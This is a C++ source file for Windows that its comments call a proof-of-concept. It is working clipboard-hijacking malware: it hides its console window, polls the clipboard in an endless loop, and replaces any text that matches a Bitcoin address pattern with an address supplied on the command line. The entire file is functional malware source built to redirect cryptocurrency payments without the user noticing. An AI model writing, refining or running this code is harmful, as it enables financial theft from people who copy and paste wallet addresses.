#include <iostream>
#include <Windows.h>
#include <vector>
#include <regex>

using namespace std;

string WaitForClipboardUpdate(string oldValue) {
	//A lot of nesting here, could be worse.
	for (;;) { //This could get stuck in an infinite loop by a value being invalid but - I'm not worried for a proof-of-concept.
		if (OpenClipboard(NULL)) {
			if (IsClipboardFormatAvailable(CF_TEXT)) { //Confirms the data in the clipboard is plain text.
				HANDLE hData = GetClipboardData(CF_TEXT);
				if (hData != nullptr) {
					void* v = GlobalLock(hData);
					if (v != nullptr) {
						string s((char*)v);
						if (s != oldValue) { //Only returns the clipboard contents if it's changed since last iteration.
							GlobalUnlock(hData);
							return s;
						}
						GlobalUnlock(hData);
					}
				}
			}
			CloseClipboard();
		}
		Sleep(1);
		//Not having a delay breaks the clipboard functionality for some reason.
		//I think it's from GlobalLock()
	}
}

void SetClipboard(const string value) {
	EmptyClipboard();
	int32_t strSize = value.size();
	HANDLE hGlob = GlobalAlloc(GMEM_MOVEABLE, strSize + 1);
	void* v = hGlob != 0 ? GlobalLock(hGlob) : nullptr;
	if (v != nullptr) {
		memcpy(v, value.c_str(), strSize);
		((char*)v)[strSize] = '\0';
		SetClipboardData(CF_TEXT, hGlob);
		GlobalUnlock(hGlob);
	}
}

bool isBitcoinAddress(string value) {
	regex bitcoinRegex("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"); //Regex to match Bitcoin address format.
	smatch matches;
	return regex_search(value, matches, bitcoinRegex);
}

int main(int n_args, char* args[]) {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	//Hides the console in the background.
	//I could've used something such as WinMain but I don't want to change the entry point.
	string
		bitcoin_address = n_args > 1 ? args[1] : "different-bitcoin-address",
		clipboardText = "";

	for (;;) {
		clipboardText = WaitForClipboardUpdate(clipboardText); //Only returns once the clipboards' content changes.
		if (isBitcoinAddress(clipboardText)) SetClipboard(bitcoin_address); //Changes the clipboard if it contains a bitcoin address.
	}
	return 0;
}
